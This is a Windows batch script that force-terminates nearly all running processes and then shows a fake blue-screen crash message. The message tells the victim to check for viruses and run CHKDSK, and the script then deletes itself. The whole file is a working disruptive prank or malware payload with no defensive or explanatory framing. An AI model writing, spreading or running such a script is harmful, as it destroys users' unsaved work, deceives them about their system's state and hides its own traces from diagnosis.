@echo off
setlocal enabledelayedexpansion

:: Maximize CMD window (optional)
mode con: cols=700 lines=500
powershell -command "& {Add-Type -AssemblyName PresentationFramework; [System.Windows.Forms.SendKeys]::SendWait('% {ENTER}')}" >nul 2>&1

:: Kill non-essential tasks
echo Closing non-essential applications...
tasklist /FI "STATUS eq running" > "%TEMP%\tasklist.txt"

for /F "skip=3 tokens=1,2" %%A in (%TEMP%\tasklist.txt) do (
    set "proc_name=%%A"
    set "proc_pid=%%B"

    if /I "!proc_name!" NEQ "explorer.exe" (
        if /I "!proc_name!" NEQ "taskmgr.exe" (
            if /I "!proc_name!" NEQ "cmd.exe" (
                taskkill /F /PID !proc_pid! >nul 2>&1
                echo Terminated: !proc_name!
            )
        )
    )
)

:: Simulate BSOD
color 1F
cls
echo A problem has been detected and Windows has been shut down to prevent damage to your computer.
echo.
echo Technical information:
echo *** STOP: 0x0000007B (0xFFFFFA8004AC56E0, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)
echo.
echo If this is the first time you've seen this stop error screen, restart your computer. If this screen appears again, follow these steps:
echo Check for viruses on your computer. Remove any newly installed hard drives or hard drive controllers. Check your hard drive to make sure it is properly configured and terminated.
echo Run CHKDSK /F to check for hard drive corruption, and then restart your computer.
echo.
echo Press any key to continue...
pause >nul

:: Delete self after execution
del "%~f0"
